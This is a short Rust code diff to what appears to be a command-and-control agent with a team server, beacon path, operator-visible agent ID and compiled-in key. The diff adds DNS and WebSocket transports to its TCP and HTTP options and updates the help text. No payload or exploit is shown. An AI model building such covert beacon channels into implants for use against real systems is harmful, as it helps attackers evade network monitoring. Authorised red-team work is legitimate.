@@ -46,6 +46,8 @@ fn run() -> Result<(), String> {
         cfg.transport = match v.as_str() {
             "tcp" => Transport::Tcp,
             "http" => Transport::Http,
+            "dns" => Transport::Dns,
+            "ws" | "websocket" => Transport::Ws,
             other => return Err(format!("unknown transport {other:?}")),
         };
     }
@@ -198,7 +200,7 @@ USAGE:
 
 OPTIONS:
     -s, --server <host:port>   team server (default: compiled-in, 127.0.0.1:4001)
-    -t, --transport <tcp|http> transport to use (default: compiled-in, tcp)
+    -t, --transport <tcp|http|dns|ws> transport to use (default: compiled-in, tcp)
         --http-path <path>     HTTP beacon path (default /api/v1/beacon)
     -i, --agent-id <id>        agent identity shown to operators
     -k, --psk <hex>            pre-shared key (default: compiled-in)
